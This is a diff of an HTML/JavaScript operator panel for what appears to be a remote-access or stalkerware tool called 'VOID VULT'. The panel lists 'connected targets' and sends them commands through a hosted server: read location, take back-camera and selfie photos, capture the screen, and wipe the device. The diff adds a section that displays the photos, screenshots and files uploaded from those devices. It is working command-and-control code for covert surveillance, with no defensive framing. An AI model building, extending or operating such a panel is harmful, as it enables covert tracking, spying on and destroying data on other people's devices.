@@ -6,94 +6,107 @@
 <title>VOID VULT</title>
 <style>
   :root{
-    --bg:#000000;
-    --panel:#0a0a12;
-    --border:#1a1a2e;
-    --accent:#a855f7;
-    --accent2:#22d3ee;
-    --danger:#ff2244;
-    --text:#ffffff;
-    --dim:#6677aa;
+    --bg:#0a0e1a;
+    --bg2:#101827;
+    --card:#16203a;
+    --card-hover:#1c2947;
+    --border:#233155;
+    --accent:#6d5eff;
+    --accent2:#00d4ff;
+    --danger:#ff3355;
+    --success:#00e676;
+    --text:#e8ecf5;
+    --text2:#8a97b8;
+    --text3:#556080;
   }
   *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
-  html,body{background:var(--bg);color:var(--text);font-family:'Courier New',monospace;min-height:100vh;overflow-x:hidden;}
+  html,body{background:linear-gradient(180deg,#0a0e1a 0%,#0d1424 100%);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Roboto',sans-serif;min-height:100vh;}
   body{padding:16px;display:flex;flex-direction:column;align-items:center;}
 
   /* HEADER */
-  .header{width:100%;max-width:440px;display:flex;align-items:center;justify-content:space-between;padding:12px 0;border-bottom:1px solid var(--border);margin-bottom:20px;}
-  .logo{font-size:22px;letter-spacing:.3em;background:linear-gradient(90deg,var(--accent),var(--accent2));-webkit-background-clip:text;background-clip:text;color:transparent;font-weight:900;}
-  .logo small{display:block;font-size:8px;letter-spacing:.3em;color:var(--dim);font-weight:400;margin-top:2px;}
-  .logout{font-size:10px;color:var(--dim);letter-spacing:.15em;background:none;border:1px solid var(--border);padding:6px 10px;border-radius:8px;cursor:pointer;}
-  .logout:active{background:var(--border);}
+  .header{width:100%;max-width:480px;display:flex;align-items:center;justify-content:space-between;padding:16px 20px;background:rgba(22,32,58,.6);backdrop-filter:blur(12px);border:1px solid var(--border);border-radius:14px;margin-bottom:18px;}
+  .logo{font-size:18px;letter-spacing:.15em;background:linear-gradient(90deg,var(--accent),var(--accent2));-webkit-background-clip:text;background-clip:text;color:transparent;font-weight:800;}
+  .logo small{display:block;font-size:8px;letter-spacing:.3em;color:var(--text3);font-weight:500;margin-top:2px;}
+  .logout{font-size:10px;color:var(--text2);letter-spacing:.15em;background:var(--card);border:1px solid var(--border);padding:8px 14px;border-radius:10px;cursor:pointer;}
+  .logout:active{background:var(--card-hover);}
 
-  /* SCREENS */
-  .screen{width:100%;max-width:440px;display:none;}
+  .screen{width:100%;max-width:480px;display:none;}
   .screen.active{display:block;}
 
   /* LOGIN */
-  .login-wrap{padding:40px 24px;}
-  .login-title{text-align:center;font-size:34px;letter-spacing:.2em;font-weight:900;color:#fff;margin-bottom:4px;}
-  .login-sub{text-align:center;font-size:9px;letter-spacing:.4em;color:var(--dim);margin-bottom:40px;}
-  .field{width:100%;background:#0a0a12;border:1px solid var(--border);border-radius:10px;padding:16px;color:#fff;font-size:14px;font-family:inherit;letter-spacing:.1em;margin-bottom:14px;text-align:center;outline:none;}
-  .field:focus{border-color:var(--accent);}
-  .field::placeholder{color:#333;letter-spacing:.15em;}
-  .btn-main{width:100%;padding:18px;border:none;border-radius:10px;font-family:inherit;font-weight:900;letter-spacing:.25em;font-size:14px;color:#000;background:linear-gradient(90deg,var(--accent),var(--accent2));cursor:pointer;box-shadow:0 0 24px rgba(168,85,247,.4);}
+  .login-wrap{background:var(--card);border:1px solid var(--border);border-radius:20px;padding:36px 24px;margin-top:40px;}
+  .login-title{text-align:center;font-size:30px;letter-spacing:.15em;font-weight:800;color:#fff;margin-bottom:6px;}
+  .login-sub{text-align:center;font-size:10px;letter-spacing:.35em;color:var(--text3);margin-bottom:36px;}
+  .field{width:100%;background:var(--bg);border:1px solid var(--border);border-radius:12px;padding:16px;color:#fff;font-size:14px;font-family:inherit;letter-spacing:.1em;margin-bottom:14px;text-align:center;outline:none;transition:.2s;}
+  .field:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(109,94,255,.15);}
+  .field::placeholder{color:var(--text3);letter-spacing:.15em;}
+  .btn-main{width:100%;padding:18px;border:none;border-radius:12px;font-family:inherit;font-weight:800;letter-spacing:.2em;font-size:13px;color:#fff;background:linear-gradient(135deg,var(--accent),var(--accent2));cursor:pointer;box-shadow:0 8px 24px rgba(109,94,255,.35);transition:.2s;}
   .btn-main:active{transform:scale(.98);}
 
   /* DEVICE LIST */
-  .device-card{background:#0a0a12;border:1px solid var(--border);border-radius:14px;padding:16px;margin-bottom:12px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;}
-  .device-card:active{background:#111122;}
+  .page-title{font-size:22px;font-weight:800;letter-spacing:.1em;color:#fff;margin-bottom:4px;}
+  .page-sub{font-size:11px;color:var(--text3);letter-spacing:.2em;margin-bottom:20px;}
+  .device-card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:18px;margin-bottom:12px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;transition:.15s;}
+  .device-card:active{background:var(--card-hover);transform:scale(.99);}
   .device-card .info{flex:1;}
-  .device-card .dev-id{font-size:16px;font-weight:900;letter-spacing:.15em;color:#fff;}
-  .device-card .dev-model{font-size:11px;color:var(--dim);letter-spacing:.1em;margin-top:2px;}
-  .device-card .status{font-size:9px;letter-spacing:.2em;padding:4px 8px;border-radius:12px;}
-  .device-card .status.online{background:rgba(34,211,238,.15);color:var(--accent2);}
-  .device-card .status.offline{background:rgba(102,119,170,.15);color:var(--dim);}
+  .device-card .dev-id{font-size:17px;font-weight:800;letter-spacing:.1em;color:#fff;}
+  .device-card .dev-model{font-size:11px;color:var(--text2);margin-top:4px;}
+  .device-card .status{font-size:9px;font-weight:700;letter-spacing:.15em;padding:6px 12px;border-radius:20px;}
+  .device-card .status.online{background:rgba(0,230,118,.15);color:var(--success);box-shadow:0 0 12px rgba(0,230,118,.2);}
+  .device-card .status.offline{background:rgba(138,151,184,.1);color:var(--text3);}
 
-  /* DEVICE DETAIL */
-  .back-btn{background:none;border:none;color:var(--dim);font-family:inherit;font-size:11px;letter-spacing:.15em;padding:6px 0;margin-bottom:14px;cursor:pointer;}
-  .detail-title{font-size:20px;font-weight:900;letter-spacing:.15em;margin-bottom:6px;}
-  .detail-sub{font-size:10px;color:var(--dim);letter-spacing:.1em;margin-bottom:20px;}
+  /* DETAIL */
+  .back-btn{background:var(--card);border:1px solid var(--border);color:var(--text2);font-size:11px;letter-spacing:.15em;padding:10px 16px;border-radius:10px;margin-bottom:16px;cursor:pointer;}
+  .back-btn:active{background:var(--card-hover);}
+  .detail-title{font-size:22px;font-weight:800;letter-spacing:.1em;color:#fff;margin-bottom:4px;}
+  .detail-sub{font-size:11px;color:var(--text2);letter-spacing:.1em;margin-bottom:20px;}
+  .section-label{font-size:11px;font-weight:700;letter-spacing:.25em;color:var(--text3);margin:24px 0 12px;display:flex;align-items:center;gap:8px;}
+  .section-label::before{content:'';width:3px;height:14px;background:linear-gradient(180deg,var(--accent),var(--accent2));border-radius:2px;}
 
-  /* CONTROL GRID */
-  .grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:20px;}
-  .ctrl{background:#0a0a12;border:1px solid var(--border);border-radius:12px;padding:16px 12px;display:flex;flex-direction:column;align-items:center;text-align:center;cursor:pointer;transition:.15s;}
-  .ctrl:active{background:#151530;border-color:var(--accent);}
-  .ctrl .icon{font-size:22px;margin-bottom:8px;}
-  .ctrl .label{font-size:10px;letter-spacing:.15em;color:#cce;font-weight:600;}
-  .ctrl.danger{border-color:rgba(255,34,68,.4);}
-  .ctrl.danger:active{background:rgba(255,34,68,.1);}
-  .ctrl.danger .icon{filter:hue-rotate(-40deg);}
+  /* GRID */
+  .grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:8px;}
+  .ctrl{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:18px 10px;display:flex;flex-direction:column;align-items:center;text-align:center;cursor:pointer;transition:.15s;gap:8px;}
+  .ctrl:active{background:var(--card-hover);border-color:var(--accent);transform:scale(.97);}
+  .ctrl .icon{font-size:24px;filter:drop-shadow(0 0 8px rgba(109,94,255,.4));}
+  .ctrl .label{font-size:10px;font-weight:700;letter-spacing:.15em;color:var(--text);}
+  .ctrl.danger{border-color:rgba(255,51,85,.35);}
+  .ctrl.danger .icon{filter:drop-shadow(0 0 8px rgba(255,51,85,.5));}
+  .ctrl.danger:active{background:rgba(255,51,85,.08);}
 
-  /* OUTPUT AREA */
-  .output{background:#050510;border:1px solid var(--border);border-radius:10px;padding:14px;font-size:11px;color:#8af;font-family:'Courier New',monospace;line-height:1.5;max-height:220px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;margin-bottom:14px;}
-  .output .empty{color:#333;text-align:center;padding:20px 0;letter-spacing:.15em;}
+  /* FILES BOX */
+  .files-box{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:16px;min-height:100px;margin-bottom:8px;}
+  .files-empty{color:var(--text3);text-align:center;padding:30px 0;font-size:11px;letter-spacing:.2em;}
 
-  /* BOTTOM NAV */
-  .bottom-nav{width:100%;max-width:440px;position:fixed;bottom:0;left:0;right:0;margin:0 auto;background:#050510;border-top:1px solid var(--border);display:flex;justify-content:space-around;padding:10px 0;z-index:10;}
-  .nav-item{background:none;border:none;color:var(--dim);font-family:inherit;font-size:9px;letter-spacing:.15em;display:flex;flex-direction:column;align-items:center;gap:4px;padding:6px 12px;cursor:pointer;}
+  /* OUTPUT */
+  .output{background:#0a0e1a;border:1px solid var(--border);border-radius:14px;padding:18px;font-size:14px;color:#a7c7ff;font-family:'Menlo','Courier New',monospace;line-height:1.7;max-height:55vh;min-height:180px;overflow-y:auto;white-space:pre-wrap;word-break:break-word;box-shadow:inset 0 0 30px rgba(109,94,255,.05);}
+  .output .empty{color:var(--text3);text-align:center;padding:50px 0;letter-spacing:.2em;font-size:12px;}
+
+  /* NAV */
+  .bottom-nav{width:100%;max-width:480px;position:fixed;bottom:0;left:0;right:0;margin:0 auto;background:rgba(16,24,39,.95);backdrop-filter:blur(20px);border-top:1px solid var(--border);display:flex;justify-content:space-around;padding:12px 0;z-index:10;}
+  .nav-item{background:none;border:none;color:var(--text3);font-family:inherit;font-size:9px;font-weight:700;letter-spacing:.15em;display:flex;flex-direction:column;align-items:center;gap:4px;padding:6px 16px;cursor:pointer;}
   .nav-item.active{color:var(--accent2);}
-  .nav-item .ic{font-size:18px;}
+  .nav-item .ic{font-size:20px;}
 
   /* TOAST */
-  .toast{position:fixed;bottom:80px;left:50%;transform:translateX(-50%);background:#111122;border:1px solid var(--accent);color:#fff;padding:12px 20px;border-radius:10px;font-size:11px;letter-spacing:.1em;opacity:0;transition:.3s;pointer-events:none;z-index:100;}
+  .toast{position:fixed;bottom:80px;left:50%;transform:translateX(-50%);background:var(--card);border:1px solid var(--accent);color:#fff;padding:14px 24px;border-radius:12px;font-size:12px;letter-spacing:.1em;opacity:0;transition:.3s;pointer-events:none;z-index:100;box-shadow:0 8px 24px rgba(109,94,255,.3);}
   .toast.show{opacity:1;}
 
-  /* SPINNER */
-  .loading{text-align:center;padding:40px 0;color:var(--dim);font-size:11px;letter-spacing:.2em;}
-  .loading::after{content:'...';animation:dots 1.5s infinite;}
-  @keyframes dots{0%,20%{content:'.'}40%{content:'..'}60%,100%{content:'...'}}
+  .loading{text-align:center;padding:40px 0;color:var(--text3);font-size:11px;letter-spacing:.2em;}
+
+  /* Screen viewer modal */
+  .modal{position:fixed;inset:0;background:rgba(0,0,0,.92);display:none;align-items:center;justify-content:center;z-index:200;padding:20px;}
+  .modal.show{display:flex;}
+  .modal img{max-width:100%;max-height:90vh;border-radius:12px;border:1px solid var(--accent);}
+  .modal-close{position:absolute;top:20px;right:20px;background:var(--card);border:1px solid var(--border);color:#fff;padding:10px 16px;border-radius:10px;font-size:12px;letter-spacing:.1em;cursor:pointer;}
 </style>
 </head>
 <body>
 
-<!-- HEADER -->
 <div class="header">
   <div class="logo">VOID VULT<small>CONTROL PANEL</small></div>
   <button class="logout" id="logoutBtn" style="display:none;">LOGOUT</button>
 </div>
 
-<!-- LOGIN SCREEN -->
 <div class="screen active" id="screenLogin">
   <div class="login-wrap">
     <div class="login-title">VOID VULT</div>
@@ -104,21 +117,18 @@
   </div>
 </div>
 
-<!-- DEVICE LIST SCREEN -->
 <div class="screen" id="screenList">
-  <div class="detail-title">DEVICES</div>
-  <div class="detail-sub">CONNECTED TARGETS</div>
-  <div id="deviceListContainer">
-    <div class="loading">LOADING</div>
-  </div>
+  <div class="page-title">DEVICES</div>
+  <div class="page-sub">CONNECTED TARGETS</div>
+  <div id="deviceListContainer"><div class="loading">LOADING</div></div>
 </div>
 
-<!-- DEVICE DETAIL SCREEN -->
 <div class="screen" id="screenDetail">
   <button class="back-btn" id="backBtn">&lt; BACK</button>
   <div class="detail-title" id="detailTitle">—</div>
   <div class="detail-sub" id="detailSub">—</div>
 
+  <div class="section-label">REMOTE CONTROL</div>
   <div class="grid">
     <div class="ctrl" data-cmd="loc"><div class="icon">📍</div><div class="label">LOCATION</div></div>
     <div class="ctrl" data-cmd="cam"><div class="icon">📸</div><div class="label">BACK CAM</div></div>
@@ -138,11 +148,13 @@
     <div class="ctrl danger" data-cmd="wipe"><div class="icon">⚠️</div><div class="label">WIPE</div></div>
   </div>
 
-  <div class="detail-sub">OUTPUT</div>
+  <div class="section-label">FILES RECEIVED</div>
+  <div class="files-box" id="filesBox"><div class="files-empty">NO FILES YET</div></div>
+
+  <div class="section-label">OUTPUT</div>
   <div class="output" id="outputBox"><div class="empty">NO OUTPUT YET</div></div>
 </div>
 
-<!-- BOTTOM NAV -->
 <div class="bottom-nav" id="bottomNav" style="display:none;">
   <button class="nav-item active" data-screen="screenList"><span class="ic">◉</span>DEVICES</button>
   <button class="nav-item" data-screen="screenDetail"><span class="ic">⚙</span>CONTROL</button>
@@ -150,56 +162,26 @@
 
 <div class="toast" id="toast"></div>
 
+<div class="modal" id="imgModal">
+  <button class="modal-close" onclick="document.getElementById('imgModal').classList.remove('show')">CLOSE</button>
+  <img id="imgModalImg" src="">
+</div>
+
 <script>
-// ============================================================
-//   CONFIG
-// ============================================================
 const SERVER = "https://void-vult-server.onrender.com";
+let state = {token:null, userId:null, currentDevice:null, pollTimer:null};
 
-// ============================================================
-//   STATE
-// ============================================================
-let state = {
-  token: null,
-  userId: null,
-  currentDevice: null,
-  pollTimer: null
-};
-
-// ============================================================
-//   HELPERS
-// ============================================================
 function $(id){return document.getElementById(id);}
+function showToast(msg){const t=$('toast');t.textContent=msg;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),2200);}
+function showScreen(id){document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));$(id).classList.add('active');window.scrollTo(0,0);}
+function esc(s){return String(s).replace(/[&<>]/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));}
 
-function showToast(msg){
-  const t = $('toast');
-  t.textContent = msg;
-  t.classList.add('show');
-  setTimeout(()=>t.classList.remove('show'), 2200);
-}
-
-function showScreen(id){
-  document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
-  $(id).classList.add('active');
-}
-
-function esc(s){
-  return String(s).replace(/[&<>]/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));
-}
-
-// ============================================================
-//   LOGIN
-// ============================================================
 $('loginBtn').addEventListener('click', async ()=>{
   const u = $('loginUser').value.trim();
   const p = $('loginPass').value.trim();
   if(!u || !p){ showToast('Enter username and user ID'); return; }
   try{
-    const r = await fetch(SERVER+'/login',{
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({username:u, password:p})
-    });
+    const r = await fetch(SERVER+'/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u, password:p})});
     const j = await r.json();
     if(!j.ok){ showToast('Invalid credentials'); return; }
     state.token = j.token;
@@ -209,24 +191,17 @@ $('loginBtn').addEventListener('click', async ()=>{
     showToast('Access granted');
     showScreen('screenList');
     loadDevices();
-  }catch(e){
-    showToast('Server unreachable');
-  }
+  }catch(e){ showToast('Server unreachable'); }
 });
 
 $('logoutBtn').addEventListener('click', ()=>{
-  state.token = null;
-  state.userId = null;
-  state.currentDevice = null;
+  state.token = null; state.userId = null; state.currentDevice = null;
   if(state.pollTimer) clearInterval(state.pollTimer);
   $('logoutBtn').style.display = 'none';
   $('bottomNav').style.display = 'none';
   showScreen('screenLogin');
 });
 
-// ============================================================
-//   DEVICE LIST
-// ============================================================
 async function loadDevices(){
   const c = $('deviceListContainer');
   c.innerHTML = '<div class="loading">LOADING</div>';
@@ -234,7 +209,7 @@ async function loadDevices(){
     const r = await fetch(SERVER+'/devices');
     const j = await r.json();
     if(!j.ok || !j.devices.length){
-      c.innerHTML = '<div class="loading" style="animation:none;">NO DEVICES CONNECTED</div>';
+      c.innerHTML = '<div class="loading">NO DEVICES CONNECTED</div>';
       return;
     }
     c.innerHTML = '';
@@ -251,19 +226,15 @@ async function loadDevices(){
       el.addEventListener('click', ()=>openDevice(d.userId));
       c.appendChild(el);
     });
-  }catch(e){
-    c.innerHTML = '<div class="loading" style="animation:none;">SERVER ERROR</div>';
-  }
+  }catch(e){ c.innerHTML = '<div class="loading">SERVER ERROR</div>'; }
 }
 
-// ============================================================
-//   DEVICE DETAIL
-// ============================================================
 async function openDevice(userId){
   state.currentDevice = userId;
   $('detailTitle').textContent = userId;
   $('detailSub').textContent = 'LOADING INFO';
   $('outputBox').innerHTML = '<div class="empty">NO OUTPUT YET</div>';
+  $('filesBox').innerHTML = '<div class="files-empty">NO FILES YET</div>';
   showScreen('screenDetail');
   try{
     const r = await fetch(SERVER+'/device?id='+encodeURIComponent(userId));
@@ -283,37 +254,22 @@ $('backBtn').addEventListener('click', ()=>{
   loadDevices();
 });
 
-// ============================================================
-//   COMMAND SEND
-// ============================================================
 document.querySelectorAll('.ctrl').forEach(el=>{
   el.addEventListener('click', async ()=>{
     if(!state.currentDevice){ showToast('No device selected'); return; }
     const cmd = el.dataset.cmd;
     const arg = el.dataset.arg || '';
-
-    if(cmd === 'wipe'){
-      if(!confirm('WIPE THE TARGET DEVICE? This cannot be undone.')) return;
-    }
-
+    if(cmd === 'wipe'){ if(!confirm('WIPE THE TARGET DEVICE? This cannot be undone.')) return; }
+    if(cmd === 'toast'){ const t = prompt('Toast message:', 'Hello'); if(t === null) return; }
     try{
-      const r = await fetch(SERVER+'/send',{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({userId:state.currentDevice, cmd:cmd, args:arg})
-      });
+      const r = await fetch(SERVER+'/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:state.currentDevice, cmd:cmd, args:arg})});
       const j = await r.json();
-      if(j.ok) showToast('Command sent: '+cmd.toUpperCase());
+      if(j.ok) showToast('Sent: '+cmd.toUpperCase());
       else showToast('Send failed');
-    }catch(e){
-      showToast('Server error');
-    }
+    }catch(e){ showToast('Server error'); }
   });
 });
 
-// ============================================================
-//   RESULT POLLING
-// ============================================================
 function startResultPoll(){
   if(state.pollTimer) clearInterval(state.pollTimer);
   state.pollTimer = setInterval(async ()=>{
@@ -321,23 +277,59 @@ function startResultPoll(){
     try{
       const r = await fetch(SERVER+'/device?id='+encodeURIComponent(state.currentDevice));
       const j = await r.json();
+
+      // Render output
       if(j.ok && j.results && j.results.length){
         const box = $('outputBox');
         box.innerHTML = '';
         j.results.slice(-10).reverse().forEach(res=>{
           const line = document.createElement('div');
-          line.style.marginBottom = '8px';
-          line.innerHTML = '<span style="color:#a855f7;">&gt; '+esc(res.cmd)+'</span><br>'+esc(res.data||'')+'<br><span style="color:#445;">'+new Date(res.at).toLocaleTimeString()+'</span>';
+          line.style.marginBottom = '14px';
+          line.style.paddingBottom = '10px';
+          line.style.borderBottom = '1px solid #1a2440';
+          line.innerHTML =
+            '<div style="color:#8b7aff;font-weight:700;font-size:13px;letter-spacing:.1em;">&gt; ' + esc(res.cmd).toUpperCase() + '</div>' +
+            '<div style="color:#a7c7ff;font-size:13px;line-height:1.6;margin-top:6px;word-break:break-word;">' + esc(res.data||'(empty)') + '</div>' +
+            '<div style="color:#445;font-size:10px;margin-top:6px;letter-spacing:.1em;">' + new Date(res.at).toLocaleTimeString() + '</div>';
           box.appendChild(line);
+        });
+      }
+
+      // Render files
+      if(j.ok && j.uploads && j.uploads.length){
+        const fb = $('filesBox');
+        fb.innerHTML = '';
+        j.uploads.slice(-20).reverse().forEach(up=>{
+          const type = (up.type || 'file').toLowerCase();
+          const url = SERVER + '/file/' + encodeURIComponent(up.name);
+          const wrapper = document.createElement('div');
+          wrapper.style.marginBottom = '12px';
+          wrapper.style.paddingBottom = '12px';
+          wrapper.style.borderBottom = '1px solid #1a2440';
+
+          if (type === 'screen' || type === 'live' || type === 'photo' || type === 'cam' || type === 'selfie') {
+            wrapper.innerHTML =
+              '<div style="color:#8b7aff;font-size:11px;font-weight:700;letter-spacing:.15em;margin-bottom:8px;">' + type.toUpperCase() + '</div>' +
+              '<img src="' + url + '" style="width:100%;border-radius:10px;border:1px solid #233155;cursor:pointer;" onclick="openImage(\'' + url + '\')"/>' +
+              '<div style="color:#556080;font-size:10px;margin-top:6px;">' + new Date(up.at).toLocaleTimeString() + '</div>';
+          } else {
+            wrapper.innerHTML =
+              '<div style="color:#8b7aff;font-size:11px;font-weight:700;letter-spacing:.15em;margin-bottom:8px;">' + type.toUpperCase() + '</div>' +
+              '<a href="' + url + '" style="color:#00d4ff;font-size:13px;word-break:break-all;">' + esc(up.name) + '</a>' +
+              '<div style="color:#556080;font-size:10px;margin-top:6px;">' + new Date(up.at).toLocaleTimeString() + '</div>';
+          }
+          fb.appendChild(wrapper);
         });
       }
     }catch(e){}
   }, 3000);
 }
 
-// ============================================================
-//   NAV
-// ============================================================
+function openImage(url){
+  $('imgModalImg').src = url;
+  $('imgModal').classList.add('show');
+}
+
 document.querySelectorAll('.nav-item').forEach(el=>{
   el.addEventListener('click', ()=>{
     document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
@@ -346,11 +338,6 @@ document.querySelectorAll('.nav-item').forEach(el=>{
     if(el.dataset.screen === 'screenList') loadDevices();
   });
 });
-
-// ============================================================
-//   AUTO-LOGIN if session exists
-// ============================================================
-// (skipped — session is in-memory only for simplicity)
 </script>
 </body>
 </html>
